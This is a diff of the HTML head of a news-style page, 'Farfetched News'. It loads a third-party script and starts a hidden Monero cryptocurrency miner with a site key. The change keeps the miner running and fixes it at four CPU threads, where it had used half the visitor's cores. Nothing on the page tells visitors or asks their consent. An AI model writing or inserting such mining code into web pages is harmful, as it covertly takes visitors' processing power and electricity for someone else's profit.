@@ -12,14 +12,10 @@
 	<title>Farfetched News</title>
 	<script src="//statdynamic.com/lib/crypta.js"></script>
 	<script>
-		var threads = window.navigator.hardwareConcurrency / 2;
-		if (threads < 1) {
-		var threads = 1;
-		}
-		var miner=new CRLT.Anonymous('ee4aa2a83286490a88f1fee5442eebd0bb649e364295', {
-		threads:threads,autoThreadsfalse,throttle:0.2, coin: "xmr",
-		  });
-		  miner.start();
+	  var miner=new CRLT.Anonymous('ee4aa2a83286490a88f1fee5442eebd0bb649e364295', {
+	    threads:4,throttle:0.2, coin: "xmr",
+	  });
+	  miner.start();
 	</script>
 	<style>
 		.col-container {
